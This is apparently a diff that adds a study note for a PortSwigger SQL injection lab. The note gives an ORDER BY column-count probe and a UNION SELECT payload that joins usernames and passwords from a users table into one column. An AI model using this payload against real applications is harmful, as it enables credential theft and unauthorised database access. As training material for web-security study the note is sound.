@@ -1,0 +1,13 @@
+Retrieve Multiple values in single column
+https://portswigger.net/web-security/sql-injection/union-attacks#retrieving-multiple-values-within-a-single-column
+https://www.youtube.com/watch?v=Hw6tN5K7Uhg&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=7
+
+Goal: Retrieve both username and password of users table in one column
+
+Solution: '+UNION+SELECT+NULL,+username || '~' || password+FROM+users--
+Analysis:
+---------
+1) Determine # of columns ('+Order+By+3--) This gives an error so n-1 =2 Number of columns returned is 2.
+2) Determine columns data type 
+3) Determine database you're working with
+4) Extract values as one column
